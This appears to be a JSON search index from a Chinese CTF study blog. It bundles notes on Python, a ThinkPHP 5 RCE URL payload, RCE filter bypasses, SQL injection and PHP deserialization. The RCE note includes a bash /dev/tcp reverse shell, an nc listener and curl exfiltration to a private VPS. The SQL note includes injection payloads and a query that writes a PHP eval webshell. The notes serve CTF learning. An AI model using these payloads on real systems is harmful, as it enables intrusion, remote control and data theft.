乱七八糟：\n\n```python\ncapitalize(str)//将字符串中第一个字母大写\ntitle(str)//字符串中每个单词首字母大写\nstr.startwith(str1)//检查字符串是否以str1开头\nstr.endwith(str1)//检查字符串是否以str1结尾\nstr.upper()//字母全大写\nstr.lower()//字母全小写\n```\n\n\n\n\n\ninput输入\n\nprint输出\n\nread读文件（按字节读），readline（按行读）\n\nopen(\"文件名\"，\"打开方式（r只读，w写入，a追加，（b）代表以二进制打开，（+）代表读写）\"，encoding=\"编码方式\")打开文件（以二进制进行读写时不能指定encoding方式）\n\n*args不定长参数，接收后生成元组\n\n**kwargs不定长参数，接收后生成字典\n\n#### Python内存管理机制：引用计数\n\n```python\na=1 #a地址引用为1\nb=a #a地址引用为2\ndel a #a地址引用为1\ndel b #a地址引用为0，此时a引用地址被销毁\n```\n\n","tags":["Python"]},{"title":"模版漏洞","url":"/posts/29600.html","content":"\n# 模版漏洞\n\n### ThinkPHP V5漏洞：\n\n```url\n?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=PHP函数名&vars[1][]=PHP函数参数1&vars[1][]=PHP函数参数2\n```\n\n该漏洞可用于执行PHP函数\n\n<!--more-->\n","tags":["CTF","web","Note"]},{"title":"RCE远程代码执行","url":"/posts/47881.html","content":"\n# **RCE远程代码执行**\n\n#### **一、RCE能做到什么：**\n\n1、执行系统命令 2、记录用户输入 3、控制键盘鼠标 4、任意上传下载 5、截屏\n\n<!--more-->\n\n#### **二、RCE产生原因：**\n\n1、服务器上有木马 \n\n2、脆弱服务未授权\n\n3、通过数据库写木马 \n\n4、文件上传/文件包含 \n\n5、危险函数（eval，assert，system，shell_exec，exec，file_put_contents） \n\n6、命令执行 \n\n7、反序列化\n\n#### **三、RCE远程代码执行关键点：**\n\n##### **1、RCE黑名单过滤：**\n\nlinux执行命令特殊字符：（;分割命令）（&&在前一个命令执行成功的前提下执行后面命令）（||前一个命令执行失败的前提下执行后面命令）（|将前面命令执行的结果作为输入，输入到后面命令中执行）（``将命令执行结果作为命令再次执行）（$()和前一个一样）\n\n过滤空格后可使用<向命令传入参数，${IFS}为空格，%0a为分号转译\n\n`cat绕过可使用tac more less head tac tail nl od(二进制查看) vi vim sort uniq`\n\n`绕过空格用%09 <> ${IFS} $IFS$9 {cat,fl*} %20`\n\n`flag绕过可使用通配符f*`\n\n##### **2、RCE无回显：**\n\n（1）、反弹shell：攻击端监听一个端口如：2333 \n\n​\t攻击端使用：\n\n```shell\nnc -lvp 监听的端口\n```\n\n​\t受害端使用如下命令生成一个反弹shell：\n\n```shell\nbash -i >& /dev/tcp/攻击端IP/攻击端监听端口 0>&1\n```\n\n​\t在攻击端终端即可在受害端中执行命令\n\n（2）、dnslog：通过ping $(命令).域名 通过这种方式获取命令执行结果\n\n（3）、写文件：将命令执行结果写入到文件中，使用echo命令：\n\n```shell\necho \"写入内容\">test.txt\n```\n\n（4）、curl等网络命令：通过POST等方式直接给到个人私有VPS中\n\n```shell\ncurl -d \"key1=value1&key2=value2&key3=value3\" protocol://ip:port/path\n```\n\n##### **3、RCE后发现不出网**\n\n（1）、写文件\n\n（2）、命令盲注：命令||sleep 100\n\n（3）、隐蔽信道\n\n##### 4、字符绕过\n\n（1）、\n\n```\n使用''或\"\"隔断字符串\n```\n\n（2）、空格可使用：<，<>，${IFS}，$IFS，%20(space)，%09(tab)，$IFS$9，$IFS$1 替换\n\n（3）、分号可使用：%0a，%0d，%0D，%0A 替换\n\n（4）、使用base64编码：Y2F0IGZsYWcucGhw|base64，将其中内容解码后执行\n\n（5）、使用`反引号包裹命令，将其中内容作为前一命令的输入\n\n##### 5、可用于执行系统命令的函数\n\nexec()、passthru()、system()、shell_exec()\n\n\n\n\n\n","tags":["web","Note","RCE"]},{"title":"SQL注入笔记","url":"/posts/26213.html","content":"\n# **SQL注入**\n\n1、通过order by爆出字段数\n\n2、union操作，联合查询，查询的是在同一个数据表的数据，通过union select 1,2,3…,n来判断回显位置\n\n3、information_schema数据库，为mysql自带数据库，提供数据库源数据访问，最常用的是\n\n**TABLES表**：提供了关于数据库中表的信息\n\n**COLUMNS表**：提供了表中列的信息\n\n<!--more-->\n\n爆破库名：\n\n```mysql\nunion select 1,2,database()\n//靠错误爆出库名\nand exists(select * from aaa)\n//aaa表并不存在，此时会报错停止并返回数据库名.aaa\n```\n\n爆破表名：\n\n```mysql\nunion select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()\nand exists(select * from 表名)//爆破出表名\n```\n\n爆破列名：\n\n```mysql\nunion select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\"想查询的表名\"\nand exists(select 列名 from 已知表名)//爆破出列名\n```\n\n4、报错注入\n\n（1）updatexml：更新XML文档的函数\n\n语法：**updatexml（文档类型，xpath路径，更新的内容）**\n\n例子：\n\n```mysql\nand updatexml(0x0a,concat(0x0a,(select database())),’1’)\n```\n\n0x0a代表换行符，concat拼接\n\n拼接目的为使得查询结果能完全显示出来\n\n（2）extractvalue：对XML文档进行查询的函数\n\n语法：**extractvalue（文档类型，xpath路径）**\n\n报错原理：路径中写入不合法的格式，就会报错并且返回我们写入的非法格式内容，我们可以利用这个得到我们想得到的内容\n\n```mysql\nand (select extractvalue(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema= 'sqli'))))\n```\n\n提示：报错最长显示30个字符内容，如果内容过长可使用substr函数进行拆分\n\n​\t例题：CTFHub技能树web-SQL注入-报错注入\n\n​\t![SQLError](/images/quiz/SQLError.png)\n\n​\t首先爆破库表列名\n\n​\t![SQLError2](/images/quiz/SQLError2.png)\n\n​\t进而发现flag过长用substr切割\n\n​\t![SQLError3](/images/quiz/SQLError3.png)\n\n​\t得到flag\n\n5、盲注：\n\n布尔盲注：回显只有两种情况，一种有一种无\n\nif表达式：if(expr1,expr2,expr3)\n\nexpr1为真就返回expr2（可用于执行函数）\n\nsubstr函数：substr(字符串,起始位置,截取长度)\n\nascii函数：将函数内字符以ascii表转换为数字，而后可以进行判断\n\n\n\n时间盲注：无回显，可以通过sleep函数判断是否为时间盲注\n\n~~建议直接sqlmap~~\n\n（1）、sleep函数看延迟时间\n\n（2）、benchmark(执行次数,方式)，执行超多次看延迟时间\n\n6、堆叠注入：通过语句分割符号（  ;  ）分隔多条语句，直接将想要的数据插入到表中，然后再通过查询语句读取\n\n7、mysql文件读写：读取：load_file函数：load_file(‘文件路径’)\n\n写入：\n\n```mysql\nselect ‘<?php eval($_POST[cmd]);?>’ into outfile或dumpfile '绝对路径';//建议用dumpfile，因为outfile会在文件末行写入新行，使用的转译换行符，会破坏文件完整性，可能导致一句话木马无法执行\n```\n\n8、关键词绕过：通过\n\n（1）、set@a：设定一个语句变量 set@sql=0x16进制数\n\n（2）、prepare : 存储一个sql语句 存到execsql 里面 prepare execsql from @sql\n\n（3）、execute :执行一个sql语句 execute execsql\n\n由于设定语句变量时，mysql会自动将16进制数据转换为文字\n\n9、零碎\n\n```mysql\nto_base64(内容)//该语句将内容经过base64编码后输出\nreplace(ori,old,new)\n```\n\n```\n%0a,/**/可代替空格\n```\n\n```\n--+，%23，#将后面的语句注释\n```\n\n10、SQL约束攻击\n\n在SQL中执行字符串处理时，字符串末尾的空格符将会被删除。例如如下代码：\n\n```sql\nSELECT userId from user where username = 'test            '//看这里有很多空格\n```\n\n上述代码和username = 'test'结果是一样的。但也存在异常情况，最好的例子就是LIKE子句了。注意，对尾部空白符的这种修剪操作，主要是在“**字符串比较**”期间进行的。这是因为，**SQL会在内部使用空格来填充字符串**，**以便在比较之前使其它们的长度保持一致**。\n\n在所有的INSERT查询中，SQL都会根据varchar(n)来限制字符串的最大长度。也就是说，如果字符串的长度大于“n”个字符的话，那么仅插入字符串的前“n”个字符。比如特定列的长度约束为“5”个字符，那么在插入字符串“testName”时，实际上只能插入字符串的前5个字符，即“testN”。\n\n```php\n//注册示例代码\n<?php\n$username = mysql_real_escape_string($_GET['username']);\n$password = mysql_real_escape_string($_GET['password']);\n$query = \"SELECT *\n          FROM users\n          WHERE username='$username'\";\n$res = mysql_query($query, $database);\nif($res) {\n  if(mysql_num_rows($res) > 0) {\n  }\n  else {\n    $query = \"INSERT INTO users(username, password)\n?>\n```\n\n这里注册时使用用户名+【大量空格】和随机密码注册即可完成攻击。\n\n主要原理就是insert时候有varchar(n)的限制，大于n的时候会截取前n个存入。在数据库对字符串进行比较时，即select操作，如果两个字符串的长度不一样，则会将较短的字符串末尾填充空格，使两个字符串的长度一致。注册时select语句不会将\"admin+[大量空格]11\"删减到n位，所以不会被select查出与admin重复，不会返回数据，接下来就可以插入admin+[空格]（截取）11和自定义密码了。\n\n如果使用用户名“vampire”和密码“random_pass”登录的话，对比时是admin与admin+[大量空格]，会将前面的admin添加空格与后面的长度相同在进行对比，那么返回的只能是我们自己注册的用户信息，而不会返回目标用户信息。SQL查询语句是一个and操作，如果密码不一样怎么会把目标用户的信息也返回回来?\n\n当登陆时使用admin与自定义密码登陆，数据库将返回我们自己注册的账户信息，但是注意此处的return $username，虽然此时查询出来的是我们自己的用户信息，但是返回的用户名则是目标的用户名。如果此后的业务逻辑直接以该用户名为准，则我们就达到了水平越权的目的。\n\n\n\n\n\n**HANDLER语句查询**\n\n出自该题[GYCTF2020]Blacklist，类似于某道堆叠注入的进阶版，但是该题过滤太多了，之前那道题的payload完全不可用了\n\n```\nreturn preg_match(\"/set|prepare|alter|rename|select|update|delete|drop|insert|where|\\./i\",$inject);\n```\n\n知识点：handler语句查询\n\n```mysql\n\nHANDLER tbl_name OPEN [ [AS] alias]\n \nHANDLER tbl_name READ index_name { = | <= | >= | < | > } (value1,value2,...)\n    [ WHERE where_condition ] [LIMIT ... ]\nHANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST }\n    [ WHERE where_condition ] [LIMIT ... ]\nHANDLER tbl_name READ { FIRST | NEXT }\n    [ WHERE where_condition ] [LIMIT ... ]\n \nHANDLER tbl_name CLOSE\n\n```\n\n构造出语句如下\n\n```\npayload:\n1';use supersqli;handler FlagHere open;handler FlagHere read first;handler FlagHere close;#\n```\n\n\n\n\n\n\n\ndistinct+列名可以去除重复值\n","tags":["web","Note","SQL"]},{"title":"CTF零碎笔记","url":"/posts/11612.html","content":"\n# 零碎笔记\n\nmt_srand( )该函数在PHP4.2.0之前传入任意参数后生成的都是伪随机数，在任何机器上只要运行的同样的seed参数结果都相同，有工具可以爆破\n\n<!--more-->\n\nKindEditor编辑器漏洞，在使用该编辑器是在url末尾加上/php/file_manager_json.php?path=路径，就会便利路径中所有内容，特征为前端代码中有对php/file_manager_json.php的引用\n\n###### md5弱相等绕过：\n\n1、构造数组a[]=xxxx&b[]=xxxx\n\n2、弱相等时转换为相同数据类型，0e开头的字符串会被转为0，字符串如下\n\n```\nQNKCDZO//0e830400451993494058024219903391\ns878926199a//0e545993274517709034328855841020\ns155964671a//0e342768416822451524974117254469\ns214587387a//0e848240448830537924465865611904\ns214587387a//0e848240448830537924465865611904\ns878926199a//0e545993274517709034328855841020\ns1091221200a//0e940624217856561557816327384675\n```\n\n\n\n## 序列化与反序列化：\n\n#### 序列化：\n\n将一个对象转化为一个有序的字符串\n\n#### 序列化格式：\n\n结构类型:\n\n```php\n对象名长度:\"对象名\":类中项目数量:{项目1类型:项目1长度:”项目1内容”;项目2类型:项目2长度:”项目2内容”;} \n```\n\n例子：\n\n```php\nO:4:\"xctf\":2:{s:4:\"flag\";s:3:\"111\";}\n//O代表对象类型，s代表字符串类型\n```\n\n#### 序列化有关函数：\n\n```php\nserialize(对象)//将对象进行序列化，返回一个字符串\n```\n\n```php\nunserialize(字符串)//将对应字符串进行反序列化操作，返回一个类\n```\n\n```php\n__wakeup()//该函数为类内函数，如果序列化中对象属性个数的值大于真是个数时就会跳过该函数执行\t\n```\n\n```PHP\n__construct\n// 触发条件，构造函数，当构造一个对象时调用。\n// 对象创建时销毁\n__destruct\n// 触发条件，析构函数，对象销毁时被调用。\n// 序列化时会销毁一次，对象销毁时执行，序列化输出前运行，但不影响序列化内容\n__unserialize\n// 触发条件，7.4版本以上，反序列化时出发，且可以绕过__wakeup\n__sleep()\n// 在对象被序列化之前运行\n__wakeup()\n// 在对象被反序列化之后被调用\n__invoke\n// 当对象被调用时执行\n// 函数形式调用对象时，触发的方法\n```\n\n","tags":["web","Note"]},{"title":"CTF","url":"/posts/58958.html","content":"\nJlan的CTF之旅从现在开始了\n\n","tags":["Note"]}]